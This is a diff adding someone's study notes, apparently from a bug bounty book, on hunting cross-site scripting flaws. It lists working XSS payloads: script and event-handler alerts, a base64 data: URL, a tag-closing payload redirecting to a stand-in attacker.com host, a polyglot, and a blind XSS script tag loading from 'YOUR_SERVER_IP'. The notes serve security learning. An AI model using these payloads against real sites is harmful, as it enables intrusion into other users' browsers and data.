@@ -1,0 +1,101 @@
+- Look for XSS in places where user input gets rendered on a page. The process will vary for the different types of XSS, but the central principle
+remains the same: check for reflected user input
+
+- But it’s important to remember that XSS vulnerabilities can also arise outside normal web applications. You can hunt for XSS in applications that communicate via non-HTTP protocols such as SMTP, SNMP, and DNS
+
+- If you are interested in these techniques, you can check out Offensive Security’s Advanced Web Attacks and Exploitation training:
+https://www.offensive-security.com/awae-oswe/.
+
+- Before you start hunting for any vulnerability, it’s good to have Burp Suite or your preferred proxy on standby. Make sure you’ve configured your
+proxy to work with your browser. You can find instructions on how to do that in Chapter 4
+
+- Step 1: Look for Input Opportunities : 
+
+-> look for opportunities to submit user input to the target site. If you’re attempting stored XSS, search for places where input gets stored by the
+server and later displayed to the user, including comment fields, user profiles, and blog posts. The types of user input that are most often reflected back to the user are forms, search boxes, and name and username fields in sign-ups.
+
+-> Don’t limit yourself to text input fields, either. Sometimes drop-down menus or numeric fields can allow you to perform XSS, because even if you
+can’t enter your payload on your browser, your proxy might let you insert it directly into the request.
+
+-> You can still attempt to submit an XSS payload by intercepting the request via a web proxy and changing the input value:
+POST /edit_user_age
+(Post request body)
+age=<script>alert('XSS by Vickie');</script>
+
+-> If you’re hoping to find reflected and DOM XSS, look for user input in URL parameters, fragments, or pathnames that get displayed to the user.
+A good way to do this is to insert a custom string into each URL parameter and check whether it shows up in the returned page. Make this string spe-
+cific enough that you’ll be sure your input caused it if you see it rendered.
+
+-> Insert your custom string into every user-input opportunity you can find. Then, when you view the page in the browser, search the page’s source code for it. This should give you an idea of which user input fields appear in the resulting web page.
+
+- Step 2: Insert Payloads :
+
+-> If you are interested in IoT vulnerabilities, check out OWASP’s IoTGoat project at https://github.com/OWASP/IoTGoat/. 
+
+-> As XSS defenses become more advanced, the XSS payloads that get around these defenses grow more complex too.
+
+-> More Than a <script> Tag : 
+
+- Inserting <script> tags into victim web pages isn’t the only way to get your scripts executed in victim browsers. There are a few other tricks. First, you can change the values of attributes in HTML tags. Some HTML attributes allow you to specify a script to run if certain conditions are met
+
+- For example, the onload event attribute runs a specific script after the HTML element has loaded: <img onload=alert('The image has been loaded!') src="example.png">
+
+- Similarly, the onclick event attribute specifies the script to be executed when the element is clicked, and onerror specifies the script to run in case an error occurs loading the element
+
+- Another way you can achieve XSS is through special URL schemes, like javascript: and data:. The javascript: URL scheme allows you to execute
+JavaScript code specified in the URL
+
+- For example, entering this URL will cause an alert box with the text XSS by Vickie to appear: javascript:alert('XSS by Vickie')
+
+- This means that if you make the user load a javascript: URL, you can achieve XSS as well. Data URLs, those that use the data: scheme, allow you
+to embed small files in a URL. You can use these to embed JavaScript code into URLs too:
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
+
+- This URL will also generate an alert box, because the included data in the data URL is the base64-encoded version of the following script:
+<script>alert('XSS by Vickie')</script>
+
+- You can utilize these URLs to trigger XSS when a site allows URL input from users. A site might allow the user to load an image by using a URL and
+use it as their profile picture, like this: https://example.com/upload_profile_pic?url=IMAGE_URL
+
+- The application will then render a preview on the web page by inserting the URL into an <img> tag. If you insert a JavaScript or data URL, you can
+trick the victim’s browser into loading your JavaScript code: <img src="IMAGE_URL"/>
+
+- so you should always test by using multiple browsers when hunting for XSS.
+
+-> Closing Out HTML Tags :
+
+- When inserting an XSS payload, you’ll often have to close out a previous HTML tag by including its closing angle bracket. This is necessary when
+you’re placing your user input inside one HTML element but want to run JavaScript using a different HTML element
+
+- To close out the tag, your payload has to include the ending of an <img> tag before the JavaScript. The payload might look like this:
+"/><script>location="http://attacker.com";</script>
+
+-When injected into the <img> tag, the resulting HTML will look like this (with the injected portion in bold):
+<img src=""/><script>location="http://attacker.com";</script>">
+
+- Another way of approaching manual XSS testing is to insert an XSS polyglot, a type of XSS payload that executes in multiple contexts. Take a look at this polyglot payload published by EdOverflow at https://polyglot.innerht.ml/:
+javascript:"/*\"/*`/*' /*</template>
+</textarea></noembed></noscript></title>
+</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+
+- Insert a string of special HTML characters often used in XSS payloads, such as the following: >'<"//:=;!--. Take note of which ones the application escapes and which get rendered directly
+
+- Blind XSS flaws are harder to detect; since you can’t detect them by looking for reflected input, you can’t test for them by trying to generate an
+alert box. Instead, try making the victim’s browser generate a request to a server you own.
+
+- For example, you can submit the following payload, which will make the victim’s browser request the page /xss on your server:
+<script src='http://YOUR_SERVER_IP/xss'></script>
+
+- Then, you can monitor your server logs to see if anyone requests that page. If you see a request to the path /xss, a blind XSS has been triggered!
+Tools like XSS Hunter (https://xsshunter.com/features) can automate this process.
+
+- Although hackers typically discover new XSS vectors manually, a good way to automatically test a site for already-known XSS vectors is through fuzzing.
+
+- Step 3: Confirm the Impact :
+
+- Be aware that sites might also use user input to construct something other than the next returned web page. Your input could show up in future
+web pages, email, and file portals. 
+
+- A time delay also might occur between when the payload is submitted and when the user input is rendered. This situation is common in log files and analytics pages. If you’re targeting these, your payload might not execute until later, or in another user’s account.
+
+- And certain XSS payloads will execute under only certain contexts, such as when an admin is logged in or when the user actively clicks, or hovers over, certain HTML elements. Confirm the impact of the XSS payload by browsing to the necessary pages and performing those actions
